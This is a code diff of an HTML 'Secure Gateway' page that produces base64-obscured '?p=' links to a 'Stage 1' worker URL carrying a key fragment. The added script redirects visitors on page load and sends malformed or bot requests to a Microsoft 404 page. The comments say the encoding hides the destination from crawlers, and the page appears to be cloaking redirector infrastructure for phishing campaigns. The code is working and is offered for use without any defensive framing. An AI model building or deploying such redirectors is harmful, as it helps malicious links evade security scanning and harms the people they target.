@@ -1,69 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Secure Gateway Console</title>
+    <title>Secure Gateway</title>
+    <script>
+        // --- THE BOUNCER LOGIC ---
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const payload = urlParams.get('p');
+            
+            if (payload) {
+                try {
+                    // 1. Decode the destination
+                    const destination = atob(payload);
+                    
+                    // 2. Immediate Redirect for Humans
+                    window.location.replace(destination);
+                } catch (e) {
+                    // 3. Fallback to Microsoft 404 if payload is corrupt (Bot Protection)
+                    window.location.replace("https://learn.microsoft.com/en-us/errors/404");
+                }
+            }
+        };
+    </script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; padding: 40px; line-height: 1.6; }
-        .container { max-width: 650px; margin: auto; background: #1e293b; padding: 30px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
-        h2 { color: #38bdf8; margin-top: 0; font-weight: 600; }
-        .info { font-size: 13px; color: #94a3b8; margin-bottom: 20px; background: #0f172a; padding: 10px; border-radius: 6px; border-left: 3px solid #38bdf8; }
-        label { display: block; margin: 20px 0 8px; font-size: 14px; font-weight: 500; color: #e2e8f0; }
-        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #475569; border-radius: 8px; color: #f8fafc; font-size: 15px; outline: none; transition: border 0.2s; }
-        input:focus { border-color: #38bdf8; }
-        button { width: 100%; background: #0284c7; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; font-size: 16px; margin-top: 25px; cursor: pointer; transition: background 0.2s; }
-        button:hover { background: #0369a1; }
-        .output-section { margin-top: 30px; display: none; padding-top: 20px; border-top: 1px solid #334155; }
-        .result-label { font-size: 13px; color: #38bdf8; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.05em; }
-        .result-box { background: #020617; padding: 15px; border: 1px solid #334155; border-radius: 8px; word-break: break-all; font-family: 'Courier New', monospace; font-size: 14px; color: #10b981; }
+        /* Simple styling for the Generator UI (only visible when no ?p= is used) */
+        body { font-family: sans-serif; background: #0f172a; color: white; padding: 40px; text-align: center; }
+        .box { max-width: 500px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { background: #3b82f6; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h2>Gateway Generator</h2>
-    <div class="info">
-        <strong>Endpoint Detected:</strong> <span id="currentLoc"></span>
+    <div class="box">
+        <h2>Gateway Console</h2>
+        <p>Enter Stage 1 Link:</p>
+        <input type="text" id="target" placeholder="https://your-worker.dev/#key">
+        <br>
+        <button onclick="generate()">Generate Shielded Link</button>
+        <p id="result" style="word-break: break-all; color: #10b981; margin-top: 20px;"></p>
     </div>
 
-    <label>Source URL (Stage 1 Output)</label>
-    <input type="text" id="sourceUrl" placeholder="https://your-engine.workers.dev/#[[key]]">
-
-    <button onclick="buildLink()">GENERATE SECURE LINK</button>
-
-    <div id="outputSection" class="output-section">
-        <div class="result-label">Encoded Gateway URL</div>
-        <div class="result-box" id="finalUrl"></div>
-        <button onclick="copyToClipboard()" style="background: #10b981; margin-top: 15px; padding: 10px; font-size: 14px;">COPY LINK</button>
-    </div>
-</div>
-
-<script>
-    // Auto-detect the base URL where this file lives
-    const baseLocation = window.location.origin + window.location.pathname;
-    document.getElementById('currentLoc').innerText = baseLocation;
-
-    function buildLink() {
-        const source = document.getElementById('sourceUrl').value;
-        if(!source) { alert("Please enter the source URL."); return; }
-
-        // Encode the payload to hide destination from crawlers
-        const payload = btoa(source);
-
-        // Construct the dynamic link using 'p' for payload
-        const finalLink = `${baseLocation}?p=${payload}`;
-
-        document.getElementById('finalUrl').innerText = finalLink;
-        document.getElementById('outputSection').style.display = 'block';
-    }
-
-    function copyToClipboard() {
-        const text = document.getElementById('finalUrl').innerText;
-        navigator.clipboard.writeText(text).then(() => {
-            alert("Copied to clipboard!");
-        });
-    }
-</script>
-
+    <script>
+        function generate() {
+            const target = document.getElementById('target').value;
+            if(!target) return;
+            const encoded = btoa(target);
+            const final = window.location.origin + window.location.pathname + "?p=" + encoded;
+            document.getElementById('result').innerText = final;
+        }
+    </script>
 </body>
 </html>
